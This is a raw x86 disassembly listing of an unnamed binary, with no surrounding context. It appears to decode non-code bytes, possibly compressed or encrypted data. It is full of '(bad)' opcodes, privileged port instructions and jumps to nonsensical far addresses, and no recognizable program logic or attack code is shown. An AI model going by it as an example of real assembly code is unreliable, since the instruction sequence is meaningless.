  418e33:	stos   DWORD PTR es:[edi],eax
  418e34:	setne  BYTE PTR [edx-0xb]
  418e38:	xchg   ecx,eax
  418e39:	in     eax,dx
  418e3a:	fwait
  418e3b:	aad    0x7
  418e3d:	xchg   ebp,eax
  418e3e:	sbb    al,0x77
  418e40:	sub    eax,0xad8726cc
  418e45:	jmp    0x418df1
  418e47:	leave  
  418e48:	mov    ds:0x88f9609e,al
  418e4d:	pop    esp
  418e4e:	or     ebp,esp
  418e50:	inc    ebp
  418e51:	pop    ebx
  418e52:	and    DWORD PTR [edx-0xb],esp
  418e55:	pop    edi
  418e56:	jp     0x418ddf
  418e58:	in     eax,dx
  418e59:	scas   al,BYTE PTR es:[edi]
  418e5a:	cdq    
  418e5b:	mov    ebp,0x8300adbc
  418e60:	or     DWORD PTR [ebp-0x117d2a04],ebx
  418e66:	jne    0x418e0b
  418e68:	cwde   
  418e69:	mov    edx,edi
  418e6b:	jmp    0x37540141
  418e70:	aad    0xcd
  418e72:	inc    ebx
  418e73:	push   ebp
  418e74:	stos   BYTE PTR es:[edi],al
  418e75:	and    BYTE PTR [eax-0x72],al
  418e78:	push   0x6b9e2ddb
  418e7d:	xor    bl,ah
  418e7f:	inc    esi
  418e80:	sbb    eax,0xaedf33d2
  418e85:	jmp    0xfc944d17
  418e8a:	push   esi
  418e8b:	aad    0x15
  418e8d:	and    eax,0x9f6ffe3f
  418e92:	adc    al,0xf4
  418e94:	adc    DWORD PTR [edi],ecx
  418e96:	clc    
  418e97:	daa    
  418e98:	adc    eax,0xf54a29da
  418e9d:	inc    ebp
  418e9e:	int    0x70
  418ea0:	pushf  
  418ea1:	pop    esp
  418ea2:	call   0x786a:0xf9a24355
  418ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eaa:	push   cs
  418eab:	idiv   BYTE PTR [ecx]
  418ead:	xor    esp,DWORD PTR ds:0xf59ea8de
  418eb3:	pop    es
  418eb4:	push   ds
  418eb5:	inc    eax
  418eb6:	push   ds
  418eb7:	xlat   BYTE PTR ds:[ebx]
  418eb8:	cmp    al,0x3c
  418eba:	or     DWORD PTR [ebx+0x472553e6],esp
  418ec0:	pushf  
  418ec1:	lods   al,BYTE PTR ds:[esi]
  418ec2:	dec    DWORD PTR [eax+eiz*8-0x351ef70b]
  418ec9:	outs   dx,DWORD PTR ds:[esi]
  418eca:	dec    esp
  418ecb:	loop   0x418f21
  418ecd:	and    eax,0xbb9d8dce
  418ed2:	cmp    al,BYTE PTR [esi]
  418ed4:	add    ch,bl
  418ed6:	pop    eax
  418ed7:	cmp    dh,BYTE PTR [edi]
  418ed9:	jmp    0xa203:0x7c7ccd26
  418ee0:	pop    edi
  418ee1:	int3   
  418ee2:	mov    bh,bh
  418ee4:	or     BYTE PTR [esp+edi*4+0x77],ah
  418ee8:	sub    eax,0x8294156b
  418eed:	bound  ebx,QWORD PTR [ebp+0x320ed507]
  418ef3:	adc    DWORD PTR [edi],ebp
  418ef5:	push   ebx
  418ef6:	mov    bh,0xf0
  418ef8:	ins    DWORD PTR es:[edi],dx
  418ef9:	cmc    
  418efa:	mov    ch,0x2d
  418efc:	cmp    al,0xc1
  418efe:	and    BYTE PTR [ebp-0x679f9723],dh
  418f04:	cmp    ebp,DWORD PTR [ebx-0x1d8c1e34]
  418f0a:	imul   esi,DWORD PTR [edx],0x1d
  418f0d:	add    eax,ebp
  418f0f:	fldpi  
  418f11:	popa   
  418f12:	jo     0x418ec2
  418f14:	pop    esi
  418f15:	scas   al,BYTE PTR es:[edi]
  418f16:	adc    al,0x31
  418f18:	xchg   esp,eax
  418f19:	loope  0x418eb3
  418f1b:	fstp   TBYTE PTR fs:[ebp+0x34]
  418f1f:	push   ss
  418f20:	mov    cl,0x1a
  418f22:	jecxz  0x418f0c
  418f24:	push   ebp
  418f25:	rcr    ebp,cl
  418f27:	shl    DWORD PTR [eax+0x2ce5b14f],0xe3
  418f2e:	outs   dx,DWORD PTR gs:[esi]
  418f30:	out    0xe2,eax
  418f32:	or     eax,0x5273e641
  418f37:	jo     0x418ef5
  418f39:	cmc    
  418f3a:	adc    eax,0x82a7350f
  418f3f:	push   0x52
  418f41:	mov    ebp,0xbf94c86
  418f46:	cmp    eax,0x7705081
  418f4b:	jae    0x418fc6
  418f4d:	retf   
  418f4e:	fisub  DWORD PTR [edx+esi*8-0x3cbea6d7]
  418f55:	cmp    ch,BYTE PTR [eax-0x5b900803]
  418f5b:	adc    ch,BYTE PTR [edi]
  418f5d:	sub    al,0xb1
  418f5f:	jno    0x418f3f
  418f61:	sbb    dl,BYTE PTR [ecx+ebx*1]
  418f64:	fldln2 
  418f66:	aam    0x8e
  418f68:	les    edx,FWORD PTR [edi+ecx*1+0x7]
  418f6c:	pop    ds
  418f6d:	push   0x713cebc3
  418f72:	ins    BYTE PTR es:[edi],dx
  418f73:	and    BYTE PTR [edx],bh
  418f75:	or     DWORD PTR [eax],edi
  418f77:	jne    0x418f23
  418f79:	push   esp
  418f7a:	jle    0x418fde
  418f7c:	imul   eax,esi,0xffffffa2
  418f7f:	retf   0xa935
  418f82:	lds    esi,FWORD PTR ds:0x4100ce65
  418f88:	adc    bh,dh
  418f8a:	ret    
  418f8b:	(bad)  
  418f8c:	mov    al,ds:0x469e722e
  418f91:	mov    ebx,0xa147dacc
  418f96:	aam    0x70
  418f98:	dec    ebp
  418f99:	and    edx,ebp
  418f9b:	inc    esi
  418f9c:	outs   dx,DWORD PTR ds:[esi]
  418f9d:	mov    ds,WORD PTR [edi]
  418f9f:	or     DWORD PTR [esi-0x528cd408],edx
  418fa5:	adc    al,0x14
  418fa7:	addr16 inc esi
  418fa9:	or     DWORD PTR [ebp+0x52],ebp
  418fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fad:	inc    ecx
  418fae:	sub    BYTE PTR [ebp+0x45307026],0x1a
  418fb5:	loop   0x418fc2
  418fb7:	test   DWORD PTR [edx],eax
  418fb9:	mov    esp,DWORD PTR [ebp+0x34]
  418fbc:	sbb    BYTE PTR [ecx-0x1e017e8d],al
  418fc2:	lea    ebx,[eax+eax*4+0x78f25838]
  418fc9:	dec    esi
  418fca:	jp     0x419015
  418fcc:	fbld   TBYTE PTR [esi+0x7ecffda5]
  418fd2:	or     al,0x8d
  418fd4:	push   ecx
  418fd5:	je     0x419003
  418fd7:	jmp    0x338:0x8da26b49
  418fde:	int3   
  418fdf:	inc    DWORD PTR [ecx-0x2ce1c05c]
  418fe5:	jnp    0x41902f
  418fe7:	add    al,0x6
  418fe9:	das    
  418fea:	rcl    DWORD PTR [ebp-0x39],cl
  418fed:	jo     0x419024
  418fef:	ror    DWORD PTR [eax-0x36addb32],cl
  418ff5:	jg     0x419074
  418ff7:	push   es
  418ff8:	sar    ah,1
  418ffa:	push   esi
  418ffb:	sub    ebx,DWORD PTR [ecx+esi*8]
  418ffe:	cmp    ch,bl
  419000:	adc    BYTE PTR [ebx-0x7612f4f7],0x30
  419007:	loopne 0x41903b
  419009:	pushf  
  41900a:	push   0xc2f415b5
  41900f:	cmp    al,0x11
  419011:	clc    
  419012:	es jge 0x41907d
  419015:	kaddb  k2,k7,k5
  419019:	pop    esp
  41901a:	adc    ah,BYTE PTR [ebx+0x74]
  41901d:	jecxz  0x419087
  41901f:	test   BYTE PTR [edx-0x650466c3],bh
  419025:	repz mov cl,0x89
  419028:	in     eax,0x90
  41902a:	clc    
  41902b:	fidivr WORD PTR [ebx+0x3e]
  41902e:	gs sbb al,0x30
  419031:	fs inc edx
  419033:	jns    0x4190b1
  419035:	(bad)  
  419036:	icebp  
  419037:	(bad)  
  419038:	loop   0x419048
  41903a:	outs   dx,BYTE PTR ds:[esi]
  41903b:	jno    0x418ff7
  41903d:	addr16 dec esi
  41903f:	stos   BYTE PTR es:[edi],al
  419040:	fcmovnu st,st(6)
  419042:	add    eax,0x32a69ef
  419047:	clc    
  419048:	aas    
  419049:	pop    edi
  41904a:	call   0x6e34f87c
  41904f:	or     BYTE PTR [esp+ecx*2],0x24
  419053:	pop    ds
  419054:	mov    bl,0xbd
  419056:	imul   edx,DWORD PTR [edx+0x6a08d019],0xe972eaf5
  419060:	jmp    0x419043
  419062:	xchg   ecx,eax
  419063:	cwde   
  419064:	xchg   edi,eax
  419065:	les    ecx,FWORD PTR [ebp+edi*8+0x3e]
  419069:	(bad)  
  41906a:	lods   al,BYTE PTR ds:[esi]
  41906b:	shl    DWORD PTR [ecx+0x5eb959c5],cl
  419071:	scas   eax,DWORD PTR es:[edi]
  419072:	jns    0x418ff4
  419074:	cmp    BYTE PTR [ecx+0x4bb6ef57],al
  41907a:	cli    
  41907b:	pop    esp
  41907c:	push   esi
  41907d:	sbb    esi,0xd0c9ffae
  419083:	mov    eax,ds:0x1c173a9d
  419088:	or     esp,DWORD PTR [edx+edx*8-0x24f07ae6]
  41908f:	cmp    al,0xfd
  419091:	pop    ecx
  419092:	cmp    esi,DWORD PTR [ecx+0x6cc8529c]
  419098:	out    0xbb,al
  41909a:	pop    ss
  41909b:	add    eax,0xed160695
  4190a0:	(bad)  
  4190a1:	sub    edi,DWORD PTR [ebx-0x5a02c600]
  4190a7:	adc    ch,ah
  4190a9:	xchg   esp,eax
  4190aa:	and    bl,BYTE PTR [eax-0x60c98e19]
  4190b0:	push   ebp
  4190b1:	mov    ebp,0x164d4ed3
  4190b6:	div    esi
  4190b8:	cmp    eax,0x6fdfd0f4
  4190bd:	jnp    0x419113
  4190bf:	stos   BYTE PTR es:[edi],al
  4190c0:	imul   ebp,DWORD PTR [esp+eax*4-0x450ce8f3],0x289b14b9
  4190cb:	imul   ebx,ebp,0x5d4df4b5
  4190d1:	fnstenv [ecx+0x5f8e8b50]
  4190d7:	pushaw 
  4190d9:	fs jb  0x4190db
  4190dc:	std    
  4190dd:	fcom   QWORD PTR [esi-0x2d]
  4190e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190e1:	dec    esp
  4190e2:	rcl    esi,cl
  4190e4:	jecxz  0x4190b5
  4190e6:	test   DWORD PTR [esi],edx
  4190e8:	xlat   BYTE PTR ds:[ebx]
  4190e9:	fst    DWORD PTR [ebx]
  4190eb:	fisub  WORD PTR [edx]
  4190ed:	idiv   esp
  4190ef:	dec    eax
  4190f0:	push   esp
  4190f1:	add    esp,DWORD PTR [ecx]
  4190f3:	and    eax,0x948f67e0
  4190f8:	and    eax,eax
  4190fa:	aaa    
  4190fb:	jmp    0x3f17:0xe2e2019c
  419102:	mov    ds:0xb63954bd,al
  419107:	jmp    0x5c43:0x60cc0bde
  41910e:	xchg   edx,eax
  41910f:	push   esi
  419110:	cmp    eax,0x963cb078
  419115:	mov    bh,0x58
  419117:	arpl   ax,bp
  419119:	test   al,0xf7
  41911b:	push   0x58
  41911d:	ret    
  41911e:	in     al,0x14
  419120:	inc    ebp
  419121:	(bad)  
  419122:	das    
  419123:	in     al,0x39
  419125:	add    ebx,DWORD PTR [ecx-0xafe28ed]
  41912b:	and    dh,BYTE PTR [esp+eax*8+0x4d]
  41912f:	imul   edi,DWORD PTR [ebp+edx*8+0x2106a407],0xffffffdf
  419137:	ret    0xba7
  41913a:	lods   al,BYTE PTR ds:[esi]
  41913b:	sbb    edi,DWORD PTR [edi]
  41913d:	pop    edi
  41913e:	pop    edx
  41913f:	inc    edi
  419140:	in     eax,dx
  419141:	fisttp QWORD PTR [esp+edi*4]
  419144:	mov    ch,0x8
  419146:	jmp    0xfc72434a
  41914b:	or     ecx,DWORD PTR [ebx]
  41914d:	sbb    ecx,DWORD PTR [eax]
  41914f:	out    0x4d,eax
  419151:	mov    dl,0x9c
  419153:	outs   dx,DWORD PTR ds:[esi]
  419154:	cmpxchg ah,bh
  419157:	sti    
  419158:	enter  0x5c1e,0xf
  41915c:	mov    bh,0x9f
  41915e:	inc    esi
  41915f:	pop    esi
  419160:	popa   
  419161:	shl    ebp,1
  419163:	loop   0x4190e6
  419165:	sub    eax,0x1bc05223
  41916a:	add    eax,0x9a5549b5
  41916f:	pop    ds
  419170:	(bad)  
  419171:	iret   
  419172:	inc    ebx
  419173:	mov    ebp,0x688ae761
  419178:	xor    al,0xa6
  41917a:	push   esp
  41917b:	out    dx,al
  41917c:	mov    ds:0x704d453,eax
  419181:	sbb    ecx,DWORD PTR ds:0x68973b1c
  419187:	cs int3 
  419189:	aas    
  41918a:	or     eax,0x2f7c6f40
  41918f:	add    eax,DWORD PTR ds:0x2f6ead7e
  419195:	add    DWORD PTR ds:0x5bedda43,esp
  41919b:	sahf   
  41919c:	inc    edx
  41919d:	or     edx,DWORD PTR [edx-0x4902dfd6]
  4191a3:	gs imul edi,DWORD PTR ds:[eax+0x33],0xffffff9a
  4191a9:	mov    esi,0xbe111043
  4191ae:	jl     0x419174
  4191b0:	cmp    edx,DWORD PTR [edi+0x1c72a73c]
  4191b6:	iret   
  4191b7:	pop    edx
  4191b8:	sbb    al,0x54
  4191ba:	push   edx
  4191bb:	(bad)  
  4191bd:	xchg   edx,eax
  4191be:	pusha  
  4191bf:	rcl    BYTE PTR ss:[esi-0x3130a1e1],1
  4191c6:	add    dl,cl
  4191c8:	xor    cl,0x94
  4191cb:	addr16 int 0xc
  4191ce:	jnp    0x4191ad
  4191d0:	or     ebp,DWORD PTR ds:0x6e491207
  4191d6:	sar    DWORD PTR [ebx+edx*4],1
  4191d9:	add    esi,DWORD PTR ds:0x9d1452f5
  4191df:	inc    eax
  4191e0:	jge    0x41920b
  4191e2:	cmp    si,WORD PTR [edx-0x7c]
  4191e6:	in     al,0xf3
  4191e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191e9:	pop    ebx
  4191ea:	mov    DWORD PTR [esi],esp
  4191ec:	pushf  
  4191ed:	adc    eax,0xf696231a
  4191f2:	clc    
  4191f3:	mov    ss,WORD PTR [ebx+0x4f25dbf8]
  4191f9:	mul    BYTE PTR [esi+0x44085f88]
  4191ff:	dec    ebx
  419200:	ja     0x4191e5
  419202:	pop    esp
  419203:	push   ebp
  419204:	imul   ecx,DWORD PTR [eax-0x38],0x36
  419208:	jbe    0x419199
  41920a:	push   ss
  41920b:	sbb    eax,0xf5f2635
  419210:	sbb    eax,0xaf7e8bc2
  419215:	(bad)  
  419217:	into   
  419218:	cmp    ebx,DWORD PTR [ebp+eiz*4-0x13]
  41921c:	pop    edi
  41921d:	xchg   edi,edi
  41921f:	cld    
  419220:	aas    
  419221:	mov    ds:0x6e29424e,eax
  419226:	out    0x81,eax
  419228:	into   
  419229:	mov    BYTE PTR [eax-0x7a7310b9],0x12
  419230:	mov    esi,0x982a95b7
  419235:	jb     0x41923b
  419237:	loopne 0x41921d
  419239:	jp     0x419201
  41923b:	jae    0x4192a7
  41923d:	mov    ah,al
  41923f:	arpl   di,sp
  419241:	sbb    ecx,ecx
  419243:	pop    esi
  419244:	xchg   edi,eax
  419245:	cmp    DWORD PTR [ecx],ebx
  419247:	outs   dx,BYTE PTR ds:[esi]
  419248:	xchg   esi,eax
  419249:	dec    eax
  41924a:	out    0x8a,al
  41924c:	mov    dl,0xa
  41924e:	xor    esp,ecx
  419250:	and    eax,0x5a58cd2b
  419255:	mov    eax,ds:0x800467ba
  41925a:	sub    DWORD PTR [eax+0x72db8d28],esp
  419260:	jl     0x4192c9
  419262:	sub    DWORD PTR [edx],0xfffffff4
  419265:	iret   
  419266:	push   es
  419267:	inc    ebp
  419268:	mov    cl,0xa8
  41926a:	or     esi,ebp
  41926c:	sub    ch,ah
  41926e:	fstp   DWORD PTR [edx+0x13]
  419271:	in     al,0xda
  419273:	pop    esp
  419274:	div    DWORD PTR [edi]
  419276:	mov    bh,0x48
  419278:	(bad)  
  419279:	or     BYTE PTR [edx+0x7f],bl
  41927c:	aad    0x35
  41927e:	orps   xmm0,XMMWORD PTR [edx+0x2c]
  419282:	sub    eax,0xa252b98
  419287:	mov    al,0xf0
  419289:	sbb    al,0xcf
  41928b:	xchg   edi,ecx
  41928d:	lahf   
  41928e:	ins    BYTE PTR es:[edi],dx
  41928f:	jmp    0xf5d86ec3
  419294:	xor    DWORD PTR [ebx+0x53],0x2b8a8cb8
  41929b:	je     0x41930f
  41929d:	xor    al,0xee
  41929f:	add    DWORD PTR [edx],esi
  4192a1:	sbb    bh,BYTE PTR [edx+0x53]
  4192a4:	aas    
  4192a5:	inc    esp
  4192a6:	xchg   edx,eax
  4192a7:	aad    0x10
  4192a9:	shl    bh,cl
  4192ab:	sbb    edi,ebp
  4192ad:	adc    ebp,DWORD PTR [ecx-0x4e56b589]
  4192b3:	es nop
  4192b5:	repz mov bl,0xd4
  4192b8:	iret   
  4192b9:	jecxz  0x41930c
  4192bb:	add    eax,0x6080f74
  4192c0:	pushf  
  4192c1:	ss cld 
  4192c3:	sbb    eax,0xee4e7c56
  4192c8:	test   DWORD PTR [ecx+ecx*8],ebp
  4192cb:	cld    
  4192cc:	pop    esp
  4192cd:	fcomp  st(1)
  4192cf:	ror    BYTE PTR [esp+edx*8-0x36],cl
  4192d3:	jbe    0x4192be
  4192d5:	adc    al,0x20
  4192d7:	retfw  
  4192d9:	sbb    ch,0xc9
  4192dc:	sbb    DWORD PTR [ecx+0x175d356f],edi
  4192e2:	retf   
  4192e3:	fadd   DWORD PTR [ebx+0x38fd7c43]
  4192e9:	xchg   esp,eax
  4192ea:	push   edi
  4192eb:	hlt    
  4192ec:	push   eax
  4192ed:	cs ror edx,1
  4192f0:	push   esi
  4192f1:	sub    DWORD PTR [edi+0x4671c08f],esp
  4192f7:	push   esp
  4192f8:	jno    0x41930d
  4192fa:	inc    edx
  4192fb:	ret    
  4192fc:	sub    DWORD PTR [edx+0x6a0acca7],esi
  419302:	pusha  
  419303:	retf   0x7308
  419306:	push   0x99480a12
  41930b:	fadd   DWORD PTR [ebp-0x74]
  41930e:	jae    0x419349
  419310:	mov    ds:0x2abea2c1,eax
  419315:	pop    ds
  419316:	pop    edx
  419317:	loop   0x41931c
  419319:	xchg   edx,eax
  41931a:	pop    ss
  41931b:	call   0x78e83d1a
  419320:	cmp    esi,ecx
  419322:	jmp    0x3d96:0x95dd310
  419329:	jne    0x41937d
  41932b:	enter  0x3112,0x72
  41932f:	jae    0x41939b
  419331:	xor    ch,BYTE PTR [ecx-0x7ed6370c]
  419337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419338:	lock (bad) [edx+0x23]
  41933c:	punpcklbw mm4,mm2
  41933f:	jns    0x419314
  419341:	push   eax
  419342:	mov    esp,0xe6fd715a
  419347:	mov    dl,0xa2
  419349:	jmp    0x41937a
  41934b:	push   0x356d9d5d
  419350:	loop   0x419349
  419352:	adc    BYTE PTR [edi],ah
  419354:	fs xor al,0xb0
  419357:	fs push ss
  419359:	retf   
  41935a:	xchg   DWORD PTR ds:0xa6da211a,edi
  419360:	ss push ebp
  419362:	jg     0x419396
  419364:	jl     0x4193af
  419366:	out    dx,eax
  419367:	fwait
  419368:	or     esp,DWORD PTR [eax+0x40]
  41936b:	cmp    al,0x6b
  41936d:	inc    ebp
  41936e:	arpl   WORD PTR [ebp-0x11],cx
  419371:	loop   0x419316
  419373:	out    dx,eax
  419374:	fstp   QWORD PTR [edx+0x6c404d2c]
  41937a:	scas   eax,DWORD PTR es:[edi]
  41937b:	lock aam 0x63
  41937e:	push   0x8ef3681c
  419383:	and    bl,al
  419385:	data16 stc 
  419387:	cdq    
  419388:	mov    ds:0xcaafe5f4,al
  41938d:	push   es
  41938e:	call   DWORD PTR [eax]
  419390:	test   ecx,ebp
  419392:	and    al,0xb4
  419394:	loope  0x419369
  419396:	in     eax,0xfe
  419398:	dec    ebp
  419399:	mov    WORD PTR [edi+eiz*1],?
  41939c:	js     0x419341
  41939e:	add    al,0xbd
  4193a0:	hlt    
  4193a1:	push   cs
  4193a2:	enter  0x63eb,0xb5
  4193a6:	jmp    0x93919fc7
  4193ab:	sbb    edi,DWORD PTR [edi+0x796c278f]
  4193b1:	repnz sub eax,0x94420cd3
  4193b7:	push   esi
  4193b8:	mov    edi,0x8578b569
  4193bd:	out    0xe8,al
  4193bf:	add    edi,edx
  4193c1:	sub    edi,eax
  4193c3:	adc    ah,ch
  4193c5:	test   cl,0xf1
  4193c8:	push   0xffffff8a
  4193ca:	pop    edx
  4193cb:	jbe    0x4193e1
  4193cd:	scas   eax,DWORD PTR es:[edi]
  4193ce:	cdq    
  4193cf:	xor    DWORD PTR [ecx],edx
  4193d1:	xchg   DWORD PTR [esi-0x80],eax
  4193d4:	shl    BYTE PTR [esi+eax*1-0x7fc482fc],0x27
  4193dc:	je     0x4193bb
  4193de:	sub    al,0xc8
  4193e0:	hlt    
  4193e1:	and    al,0xfb
  4193e3:	fistp  WORD PTR [ebp+eiz*2+0x78]
  4193e7:	ret    0x7627
  4193ea:	mov    ds:0x8e2200c2,al
  4193ef:	xchg   esp,eax
  4193f0:	or     BYTE PTR [ecx*4-0x26170cec],cl
  4193f7:	push   es
  4193f8:	data16 jne 0x419450
  4193fb:	push   ecx
  4193fc:	push   0xcb8f48f3
  419401:	sub    al,BYTE PTR [edi]
  419403:	jg     0x4193b1
  419405:	in     al,0x3a
  419407:	or     ah,BYTE PTR [eax]
  419409:	dec    ebp
  41940a:	(bad)  
  41940b:	int    0x18
  41940d:	in     eax,0xeb
  41940f:	xchg   esi,esp
  419411:	rcr    eax,1
  419413:	std    
  419414:	xor    al,0xf0
  419416:	xor    BYTE PTR [ebp-0x12cc06d2],cl
  41941c:	fdivr  st,st(1)
  41941e:	(bad)
  419422:	mov    ebp,0xd7cd85e6
  419427:	pop    esi
  419428:	push   cs
  419429:	xchg   esp,eax
  41942a:	enter  0xf5bd,0xbe
  41942e:	dec    ecx
  41942f:	pop    ecx
  419430:	stc    
  419431:	(bad)  
  419432:	addr16 pusha 
  419434:	add    cl,BYTE PTR [edx-0x6965994f]
  41943a:	pop    esp
  41943b:	inc    edi
  41943c:	adc    dh,BYTE PTR [ebx+0x542664c2]
  419442:	adc    bh,bh
  419444:	mov    eax,0x494a0d79
  419449:	dec    esp
  41944a:	lahf   
  41944b:	inc    ecx
  41944c:	jle    0x41947a
  41944e:	loop   0x419435
  419450:	jmp    0xf51cc722
  419455:	and    DWORD PTR [edx],esp
  419457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419458:	sub    eax,0xbca6aa1a
  41945d:	bound  edx,QWORD PTR [eax-0x1b]
  419460:	and    ecx,DWORD PTR [ecx+0x69867d0d]
  419466:	aas    
  419467:	test   DWORD PTR [ebp+0x1e],edi
  41946a:	inc    esp
  41946b:	ret    
  41946c:	arpl   di,ax
  41946e:	xchg   ecx,eax
  41946f:	sbb    esp,esi
  419471:	int3   
  419472:	mov    bh,0x5e
  419474:	jae    0x419458
  419476:	in     eax,0x9a
  419478:	xor    ebp,DWORD PTR [edi+0x3e]
  41947b:	pop    ds
  41947c:	jmp    0x41940c
  41947e:	push   ss
  41947f:	sub    al,0xf0
  419481:	les    ebp,FWORD PTR [esi]
  419483:	cmp    DWORD PTR [ebp-0x70e33b8c],0x1d
  41948a:	cwde   
  41948b:	pop    eax
  41948c:	mov    dl,0xe8
  41948e:	gs mov ebx,0x68947363
  419494:	lods   al,BYTE PTR ds:[esi]
  419495:	mov    edi,ebx
  419497:	retf   
  419498:	ja     0x419505
  41949a:	xor    dh,BYTE PTR [esi]
  41949c:	pop    ds
  41949d:	loopne 0x4194ef
  41949f:	sbb    BYTE PTR [esi],0x35
  4194a2:	xchg   esi,eax
  4194a3:	mov    dl,0x97
  4194a5:	sar    DWORD PTR [ebp+0x4b9ee4],1
  4194ab:	lods   eax,DWORD PTR ds:[esi]
  4194ac:	jl     0x419440
  4194ae:	in     eax,dx
  4194af:	sub    al,ch
  4194b1:	dec    esp
  4194b2:	hlt    
  4194b3:	cmp    esp,edx
  4194b5:	fs nop
  4194b7:	add    DWORD PTR [edi],edx
  4194b9:	sar    cl,cl
  4194bb:	push   ds
  4194bc:	aas    
  4194bd:	leave  
  4194be:	scas   eax,DWORD PTR es:[edi]
  4194bf:	xchg   ebx,eax
  4194c0:	popf   
  4194c1:	shr    esi,0xf7
  4194c4:	pop    ss
  4194c5:	sbb    eax,0x45537ad2
  4194ca:	xlat   BYTE PTR ds:[ebx]
  4194cb:	std    
  4194cc:	cmp    DWORD PTR [di-0x284f],esi
  4194d1:	jns    0x41945b
  4194d3:	inc    esp
  4194d4:	fldcw  WORD PTR [ebx]
  4194d6:	and    al,0x9e
  4194d8:	cmp    ebx,DWORD PTR [esi-0x15]
  4194db:	shl    DWORD PTR [ebx+0x73dad241],1
  4194e1:	push   edx
  4194e2:	jmp    0x419495
  4194e4:	pop    edx
  4194e5:	out    dx,eax
  4194e6:	xor    al,0x9b
  4194e8:	out    dx,eax
  4194e9:	aad    0x30
  4194eb:	std    
  4194ec:	mov    ebx,0xca83b25
  4194f1:	jne    0x419480
  4194f3:	lds    esp,FWORD PTR [ebx-0x1c]
  4194f6:	push   esi
  4194f7:	pushf  
  4194f8:	xor    al,0x54
  4194fa:	(bad)  
  4194fc:	fbld   TBYTE PTR [esi-0x49006d4c]
  419502:	jne    0x4194c1
  419504:	xchg   esi,eax
  419505:	dec    esp
  419506:	scas   al,BYTE PTR es:[edi]
  419507:	test   BYTE PTR [edx+0x12],cl
  41950a:	and    edx,DWORD PTR [ecx]
  41950c:	sti    
  41950d:	js     0x41955d
  41950f:	lea    edi,[eax+0x6ba13b28]
  419515:	sub    DWORD PTR [esi-0x6c0dcbf7],esi
  41951b:	pop    es
  41951c:	inc    eax
  41951d:	sbb    al,0xf4
  41951f:	idiv   esp
  419521:	mov    ?,WORD PTR [ebp+0x672fa8a2]
  419527:	adc    DWORD PTR [esp+edi*1+0x17],eax
  41952b:	mov    dh,0x4b
  41952d:	jecxz  0x419519
  41952f:	pop    ss
  419530:	dec    edi
  419531:	das    
  419532:	mov    ecx,0xaeced22b
  419537:	ret    0x123
  41953a:	or     eax,0xfd3e1c48
  41953f:	inc    ebp
  419540:	xlat   BYTE PTR ds:[ebx]
  419541:	and    DWORD PTR [ebp-0x40],esi
  419544:	bound  ebp,QWORD PTR [ebp+ebx*4-0x27628f05]
  41954b:	retf   
  41954c:	mov    bl,0xf0
  41954e:	cli    
  41954f:	fidiv  DWORD PTR [ebx+eax*2+0x13]
  419553:	mov    bh,0x32
  419555:	mov    ebp,0xfe44787f
  41955a:	aam    0xbd
  41955c:	xchg   esi,eax
  41955d:	mov    al,0x8c
  41955f:	out    0x63,al
  419561:	mov    cl,BYTE PTR [ebp+0x254a50ca]
  419567:	dec    ecx
  419568:	add    esp,ebx
  41956a:	push   es
  41956b:	xchg   bh,ch
  41956d:	into   
  41956e:	cmp    eax,0xdf047d47
  419573:	push   ecx
  419574:	pushf  
  419575:	push   ds
  419576:	mov    ebp,DWORD PTR [ebp-0x45bd0e94]
  41957c:	loop   0x419583
  41957e:	mov    BYTE PTR [ebx],ah
  419580:	mov    eax,0x45c48a92
  419585:	adc    al,BYTE PTR [ecx+0x610f2503]
  41958b:	inc    ebx
  41958c:	imul   eax,ebx,0xffffffbf
  41958f:	sahf   
  419590:	js     0x4195f3
  419592:	inc    edi
  419593:	xor    ch,BYTE PTR [ecx+0x69570588]
  419599:	mov    ecx,0xf1c45804
  41959f:	pop    ebp
  4195a0:	mov    ebx,DWORD PTR [ebx]
  4195a2:	dec    ecx
  4195a3:	mov    ebx,0xf4ef9b0a
  4195a8:	inc    ebx
  4195a9:	fwait
  4195aa:	push   esp
  4195ab:	cmp    al,0xc7
  4195ad:	and    eax,0x8c5497c
  4195b2:	pop    esi
  4195b3:	dec    ebp
  4195b4:	pop    esp
  4195b5:	hlt    
  4195b6:	movhlps xmm3,xmm0
  4195b9:	rcl    BYTE PTR [ebp+0x77],cl
  4195bc:	cmp    ah,BYTE PTR [ecx-0x3fc6f318]
  4195c2:	repz mov ebx,0x8a375977
  4195c8:	jnp    0x419573
  4195ca:	mov    ch,bl
  4195cc:	mov    cl,BYTE PTR [ebp+0x63]
  4195cf:	xor    al,0x5e
  4195d1:	cld    
  4195d2:	arpl   di,ax
  4195d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195d5:	in     eax,0x64
  4195d7:	dec    BYTE PTR ds:0xca423692
  4195dd:	push   ebx
  4195de:	add    eax,0x696aaa20
  4195e3:	lods   eax,DWORD PTR ds:[esi]
  4195e4:	sahf   
  4195e5:	das    
  4195e6:	sub    BYTE PTR [ebx],al
  4195e8:	les    eax,FWORD PTR [edi+0x3b]
  4195eb:	sub    ah,BYTE PTR [edx]
  4195ed:	pop    ebp
  4195ee:	lds    ecx,FWORD PTR ss:[ebp-0x66b0ac6f]
  4195f5:	add    BYTE PTR [ecx],0xae
  4195f8:	jmp    0x41963e
  4195fa:	aas    
  4195fb:	cmp    DWORD PTR [edi+0x62],edi
  4195fe:	inc    edi
  4195ff:	ins    DWORD PTR es:[edi],dx
  419600:	aam    0x95
  419602:	cmp    eax,0xe25ec5bc
  419607:	or     BYTE PTR [ebx-0x1cfd0fe6],ah
  41960d:	cld    
  41960e:	stos   DWORD PTR es:[edi],eax
  41960f:	sbb    BYTE PTR [edi+0x21683d7f],bl
  419615:	mov    esi,0xf2f6b8d7
  41961a:	test   BYTE PTR [ecx-0x70bfbb1e],0xef
  419621:	cdq    
  419622:	ret    0xa489
  419625:	rcr    BYTE PTR [edi+0x49],cl
  419628:	test   ah,cl
  41962a:	ss int3 
  41962c:	cmp    eax,0xb2118da1
  419631:	sbb    dl,cl
  419633:	popa   
  419634:	xor    DWORD PTR [eax-0x30],ecx
  419637:	stc    
  419638:	or     BYTE PTR [edx+ebx*8],bl
  41963b:	pop    esp
  41963c:	and    BYTE PTR [ebx+0x2a],dl
